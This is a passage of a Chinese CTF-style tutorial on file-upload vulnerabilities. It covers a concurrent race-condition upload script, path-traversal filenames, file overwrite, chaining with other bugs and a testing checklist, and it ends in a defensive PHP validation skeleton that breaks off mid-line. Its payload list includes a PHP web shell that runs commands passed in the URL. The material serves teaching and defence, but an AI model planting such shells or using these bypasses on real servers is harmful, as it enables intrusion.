+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">def</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#6F42C1;--1:#B392F0">probe_once</span><span style="--0:#24292E;--1:#E1E4E8">():</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">return</span><span style="--0:#24292E;--1:#E1E4E8"> requests.get(probe_url, </span><span style="--0:#AE4B07;--1:#FFAB70">timeout</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#005CC5;--1:#79B8FF">3</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">with</span><span style="--0:#24292E;--1:#E1E4E8"> ThreadPoolExecutor(</span><span style="--0:#AE4B07;--1:#FFAB70">max_workers</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#005CC5;--1:#79B8FF">20</span><span style="--0:#24292E;--1:#E1E4E8">) </span><span style="--0:#BF3441;--1:#F97583">as</span><span style="--0:#24292E;--1:#E1E4E8"> pool:</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">    </span></span><span style="--0:#24292E;--1:#E1E4E8">jobs </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> [pool.submit(upload_once </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">%</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">2</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">0</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">else</span><span style="--0:#24292E;--1:#E1E4E8"> probe_once)</span></div></div><div class="ec-line" style="--ecIndent:12ch"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span class="indent">            </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> i </span><span style="--0:#BF3441;--1:#F97583">in</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">range</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">200</span><span style="--0:#24292E;--1:#E1E4E8">)]</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">for</span><span style="--0:#24292E;--1:#E1E4E8"> job </span><span style="--0:#BF3441;--1:#F97583">in</span><span style="--0:#24292E;--1:#E1E4E8"> as_completed(jobs):</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent"><span style="--0:#24292E;--1:#E1E4E8">        </span></span><span style="--0:#24292E;--1:#E1E4E8">response </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> job.result()</span></div></div><div class="ec-line" style="--ecIndent:8ch"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span class="indent">        </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">"race-ok"</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">in</span><span style="--0:#24292E;--1:#E1E4E8"> response.text:</span></div></div><div class="ec-line" style="--ecIndent:12ch"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code"><span class="indent">            </span><span style="--0:#005CC5;--1:#79B8FF">print</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">"race condition hit"</span><span style="--0:#24292E;--1:#E1E4E8">)</span></div></div><div class="ec-line" style="--ecIndent:12ch"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span class="indent">            </span><span style="--0:#BF3441;--1:#F97583">break</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>如果服务端会改名，还得先从响应或者命名规律里找到临时文件 URL。</p></section><section><h3 id="2-路径穿越">2. 路径穿越<a class="anchor" href="#2-路径穿越"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p>文件名含 <code>../</code> 控制落地目录：</p><div class="expressive-code"><figure class="frame"><figcaption class="header"></figcaption><pre data-language="plaintext" class="wrap" style="--ecMaxLine:37ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#24292e;--1:#e1e4e8">../../shell.php  →  写到上一级目录（可能是可执行目录）</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><p>这里主要看后端会不会保留路径、会不会再做一次 URL 解码。multipart 的 <code>filename</code> 里写 <code>%2f</code>，一般不会自动变成 <code>/</code>。另外还要试清楚 <code>/</code>、<code>\</code>、<code>basename</code> 和路径规范化分别发生在哪一步。</p></section><section><h3 id="3-文件覆盖">3. 文件覆盖<a class="anchor" href="#3-文件覆盖"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p>若文件名可控且不重命名，可覆盖已存在的文件（如覆盖 <code>index.php</code>、<code>config.php</code>），属于高危逻辑缺陷。</p></section><section><h3 id="4-目录可控--执行目录">4. 目录可控 + 执行目录<a class="anchor" href="#4-目录可控--执行目录"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h3><p>有些题只在上传目录里禁脚本。如果文件名能穿越到别的可执行目录，原来的限制就管不到了。</p><hr></section></section>
+<section><h2 id="九配合其他漏洞">九、配合其他漏洞<a class="anchor" href="#九配合其他漏洞"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><div class="table-wrapper">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th>组合</th><th>原理</th></tr></thead><tbody><tr><td>上传 + 文件包含（LFI）</td><td>图片马 + 任意文件读取/包含 → RCE</td></tr><tr><td>上传 + 命令注入</td><td>文件名进入 shell 命令，<code>;</code>、`</td></tr><tr><td>上传 + SQL 注入</td><td>文件名拼入 SQL 查询</td></tr><tr><td>上传 + SSRF</td><td>上传的 URL 触发服务端请求</td></tr><tr><td>ZIP 解压 + 路径穿越</td><td>解压恶意 zip 覆盖任意文件（Zip Slip）</td></tr></tbody></table></div><hr></section>
+<section><h2 id="十实战排查流程checklist">十、实战排查流程（Checklist）<a class="anchor" href="#十实战排查流程checklist"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><p>我一般按这个顺序排：</p><ol>
+<li>先传一张正常小图，把请求和响应留好。</li>
+<li>找上传后的文件名和访问路径，看服务端有没有重命名。</li>
+<li>扩展名、MIME、文件头分开改，一次只动一个地方。</li>
+<li>从响应头、报错、路径格式里猜 Web 服务器、语言和操作系统，但别只信 <code>Server</code>。</li>
+<li>黑名单先试大小写、双写和已知替代后缀，再看 Windows 文件名特性。</li>
+<li>白名单先分清它只看文件头，还是真的解码、重绘了图片。</li>
+<li>文件传上去以后，用固定回显确认是否解析。不能执行就继续找 LFI、配置文件或路径问题。</li>
+<li>最后再看先存后删、随机文件名、目录穿越、覆盖和压缩包解压这些逻辑点。</li>
+</ol><p><strong>常用验证 payload</strong>：</p><div class="expressive-code"><figure class="frame" data-language="php"><figcaption class="header"></figcaption><pre data-language="php" class="wrap" style="--ecMaxLine:67ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">&#x3C;?</span><span style="--0:#005CC5;--1:#79B8FF">php</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">echo</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">'upload-ok'</span><span style="--0:#24292E;--1:#E1E4E8">; </span><span style="--0:#BF3441;--1:#F97583">?></span><span style="--0:#24292E;--1:#E1E4E8">                         </span><span style="--0:#616972;--1:#99A0A6">// 只验证 PHP 解析</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">&#x3C;?</span><span style="--0:#005CC5;--1:#79B8FF">php</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#005CC5;--1:#79B8FF">isset</span><span style="--0:#24292E;--1:#E1E4E8">($_GET[</span><span style="--0:#032F62;--1:#9ECBFF">'cmd'</span><span style="--0:#24292E;--1:#E1E4E8">])) </span><span style="--0:#005CC5;--1:#79B8FF">system</span><span style="--0:#24292E;--1:#E1E4E8">($_GET[</span><span style="--0:#032F62;--1:#9ECBFF">'cmd'</span><span style="--0:#24292E;--1:#E1E4E8">]); </span><span style="--0:#BF3441;--1:#F97583">?></span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#616972;--1:#99A0A6">// CTF 命令执行</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">&#x3C;?</span><span style="--0:#005CC5;--1:#79B8FF">php</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">phpinfo</span><span style="--0:#24292E;--1:#E1E4E8">(); </span><span style="--0:#BF3441;--1:#F97583">?></span><span style="--0:#24292E;--1:#E1E4E8">                                </span><span style="--0:#616972;--1:#99A0A6">// 查看题目 PHP 环境</span></div></div></code></pre><button class="copy-btn" aria-label="Copy code"><div class="copy-btn-icon"><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon copy-icon"><path d="M368.37-237.37q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-474.26q0-34.48 24.26-58.74 24.26-24.26 58.74-24.26h378.26q34.48 0 58.74 24.26 24.26 24.26 24.26 58.74v474.26q0 34.48-24.26 58.74-24.26 24.26-58.74 24.26H368.37Zm0-83h378.26v-474.26H368.37v474.26Zm-155 238q-34.48 0-58.74-24.26-24.26-24.26-24.26-58.74v-515.76q0-17.45 11.96-29.48 11.97-12.02 29.33-12.02t29.54 12.02q12.17 12.03 12.17 29.48v515.76h419.76q17.45 0 29.48 11.96 12.02 11.97 12.02 29.33t-12.02 29.54q-12.03 12.17-29.48 12.17H213.37Zm155-238v-474.26 474.26Z"></path></svg><svg viewBox="0 -960 960 960" xmlns="http://www.w3.org/2000/svg" class="copy-btn-icon success-icon"><path d="m389-377.13 294.7-294.7q12.58-12.67 29.52-12.67 16.93 0 29.61 12.67 12.67 12.68 12.67 29.53 0 16.86-12.28 29.14L419.07-288.41q-12.59 12.67-29.52 12.67-16.94 0-29.62-12.67L217.41-430.93q-12.67-12.68-12.79-29.45-.12-16.77 12.55-29.45 12.68-12.67 29.62-12.67 16.93 0 29.28 12.67L389-377.13Z"></path></svg></div></button></figure></div><hr></section>
+<section><h2 id="十一防御措施">十一、防御措施<a class="anchor" href="#十一防御措施"><span class="anchor-icon" data-pagefind-ignore="">#</span></a></h2><p><strong>安全代码骨架（PHP 7+ 示例）</strong>：</p><div class="expressive-code"><figure class="frame" data-language="php"><figcaption class="header"></figcaption><pre data-language="php" class="wrap" style="--ecMaxLine:93ch"><code><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">1</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">&#x3C;?</span><span style="--0:#005CC5;--1:#79B8FF">php</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">2</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">declare</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">strict_types</span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#005CC5;--1:#79B8FF">1</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">3</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">4</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">const</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">MAX_UPLOAD_BYTES</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">5</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1024</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">*</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">1024</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">5</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">const</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">MAX_IMAGE_PIXELS</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">20000000</span><span style="--0:#24292E;--1:#E1E4E8">;</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">6</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">7</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">!</span><span style="--0:#005CC5;--1:#79B8FF">isset</span><span style="--0:#24292E;--1:#E1E4E8">($_FILES[</span><span style="--0:#032F62;--1:#9ECBFF">'file'</span><span style="--0:#24292E;--1:#E1E4E8">])</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">8</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">||</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">!</span><span style="--0:#005CC5;--1:#79B8FF">is_array</span><span style="--0:#24292E;--1:#E1E4E8">($_FILES[</span><span style="--0:#032F62;--1:#9ECBFF">'file'</span><span style="--0:#24292E;--1:#E1E4E8">])</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">9</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">||</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">!</span><span style="--0:#005CC5;--1:#79B8FF">isset</span><span style="--0:#24292E;--1:#E1E4E8">($_FILES[</span><span style="--0:#032F62;--1:#9ECBFF">'file'</span><span style="--0:#24292E;--1:#E1E4E8">][</span><span style="--0:#032F62;--1:#9ECBFF">'error'</span><span style="--0:#24292E;--1:#E1E4E8">], $_FILES[</span><span style="--0:#032F62;--1:#9ECBFF">'file'</span><span style="--0:#24292E;--1:#E1E4E8">][</span><span style="--0:#032F62;--1:#9ECBFF">'tmp_name'</span><span style="--0:#24292E;--1:#E1E4E8">], $_FILES[</span><span style="--0:#032F62;--1:#9ECBFF">'file'</span><span style="--0:#24292E;--1:#E1E4E8">][</span><span style="--0:#032F62;--1:#9ECBFF">'name'</span><span style="--0:#24292E;--1:#E1E4E8">])</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">10</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">||</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">is_array</span><span style="--0:#24292E;--1:#E1E4E8">($_FILES[</span><span style="--0:#032F62;--1:#9ECBFF">'file'</span><span style="--0:#24292E;--1:#E1E4E8">][</span><span style="--0:#032F62;--1:#9ECBFF">'error'</span><span style="--0:#24292E;--1:#E1E4E8">])</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">11</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">||</span><span style="--0:#24292E;--1:#E1E4E8"> $_FILES[</span><span style="--0:#032F62;--1:#9ECBFF">'file'</span><span style="--0:#24292E;--1:#E1E4E8">][</span><span style="--0:#032F62;--1:#9ECBFF">'error'</span><span style="--0:#24292E;--1:#E1E4E8">] </span><span style="--0:#BF3441;--1:#F97583">!==</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">UPLOAD_ERR_OK</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">12</div></div><div class="code"><span class="indent">    </span><span style="--0:#005CC5;--1:#79B8FF">http_response_code</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">400</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">13</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">exit</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">'upload failed'</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">14</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">15</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">16</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">$file </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> $_FILES[</span><span style="--0:#032F62;--1:#9ECBFF">'file'</span><span style="--0:#24292E;--1:#E1E4E8">];</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">17</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">$tmp </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> $file[</span><span style="--0:#032F62;--1:#9ECBFF">'tmp_name'</span><span style="--0:#24292E;--1:#E1E4E8">];</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">18</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">$size </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">filesize</span><span style="--0:#24292E;--1:#E1E4E8">($tmp);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">19</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">20</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">!</span><span style="--0:#005CC5;--1:#79B8FF">is_uploaded_file</span><span style="--0:#24292E;--1:#E1E4E8">($tmp) </span><span style="--0:#BF3441;--1:#F97583">||</span><span style="--0:#24292E;--1:#E1E4E8"> $size </span><span style="--0:#BF3441;--1:#F97583">===</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">false</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">||</span><span style="--0:#24292E;--1:#E1E4E8"> $size </span><span style="--0:#BF3441;--1:#F97583">></span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">MAX_UPLOAD_BYTES</span><span style="--0:#24292E;--1:#E1E4E8">) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">21</div></div><div class="code"><span class="indent">    </span><span style="--0:#005CC5;--1:#79B8FF">http_response_code</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">400</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">22</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">exit</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#032F62;--1:#9ECBFF">'invalid upload'</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">23</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">}</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">24</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">25</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">$allowed </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> [</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">26</div></div><div class="code"><span class="indent">    </span><span style="--0:#032F62;--1:#9ECBFF">'jpg'</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=></span><span style="--0:#24292E;--1:#E1E4E8"> [</span><span style="--0:#032F62;--1:#9ECBFF">'mime'</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=></span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">'image/jpeg'</span><span style="--0:#24292E;--1:#E1E4E8">, </span><span style="--0:#032F62;--1:#9ECBFF">'type'</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=></span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">IMAGETYPE_JPEG</span><span style="--0:#24292E;--1:#E1E4E8">],</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">27</div></div><div class="code"><span class="indent">    </span><span style="--0:#032F62;--1:#9ECBFF">'png'</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=></span><span style="--0:#24292E;--1:#E1E4E8"> [</span><span style="--0:#032F62;--1:#9ECBFF">'mime'</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=></span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">'image/png'</span><span style="--0:#24292E;--1:#E1E4E8">,  </span><span style="--0:#032F62;--1:#9ECBFF">'type'</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=></span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">IMAGETYPE_PNG</span><span style="--0:#24292E;--1:#E1E4E8">],</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">28</div></div><div class="code"><span class="indent">    </span><span style="--0:#032F62;--1:#9ECBFF">'gif'</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=></span><span style="--0:#24292E;--1:#E1E4E8"> [</span><span style="--0:#032F62;--1:#9ECBFF">'mime'</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=></span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#032F62;--1:#9ECBFF">'image/gif'</span><span style="--0:#24292E;--1:#E1E4E8">,  </span><span style="--0:#032F62;--1:#9ECBFF">'type'</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#BF3441;--1:#F97583">=></span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">IMAGETYPE_GIF</span><span style="--0:#24292E;--1:#E1E4E8">],</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">29</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">];</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">30</div></div><div class="code">
+</div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">31</div></div><div class="code"><span style="--0:#24292E;--1:#E1E4E8">$ext </span><span style="--0:#BF3441;--1:#F97583">=</span><span style="--0:#24292E;--1:#E1E4E8"> </span><span style="--0:#005CC5;--1:#79B8FF">strtolower</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">pathinfo</span><span style="--0:#24292E;--1:#E1E4E8">((</span><span style="--0:#BF3441;--1:#F97583">string</span><span style="--0:#24292E;--1:#E1E4E8">) $file[</span><span style="--0:#032F62;--1:#9ECBFF">'name'</span><span style="--0:#24292E;--1:#E1E4E8">], </span><span style="--0:#005CC5;--1:#79B8FF">PATHINFO_EXTENSION</span><span style="--0:#24292E;--1:#E1E4E8">));</span></div></div><div class="ec-line"><div class="gutter"><div class="ln" aria-hidden="true">32</div></div><div class="code"><span style="--0:#BF3441;--1:#F97583">if</span><span style="--0:#24292E;--1:#E1E4E8"> (</span><span style="--0:#BF3441;--1:#F97583">!</span><span style="--0:#005CC5;--1:#79B8FF">isset</span><span style="--0:#24292E;--1:#E1E4E8">($allowed[$ext])) {</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">33</div></div><div class="code"><span class="indent">    </span><span style="--0:#005CC5;--1:#79B8FF">http_response_code</span><span style="--0:#24292E;--1:#E1E4E8">(</span><span style="--0:#005CC5;--1:#79B8FF">415</span><span style="--0:#24292E;--1:#E1E4E8">);</span></div></div><div class="ec-line" style="--ecIndent:4ch"><div class="gutter"><div class="ln" aria-hidden="true">34</div></div><div class="code"><span class="indent">    </span><span style="--0:#BF3441;--1:#F97583">exit</span><span 